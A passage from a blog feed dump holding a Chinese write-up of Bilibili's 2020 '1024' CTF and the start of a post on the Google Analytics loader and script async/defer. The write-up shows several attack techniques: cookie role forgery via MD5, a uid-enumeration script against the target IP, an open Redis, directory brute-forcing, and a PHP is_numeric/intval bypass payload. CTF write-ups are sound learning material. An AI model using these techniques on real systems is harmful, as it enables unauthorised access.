4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\"> <div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-25</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span 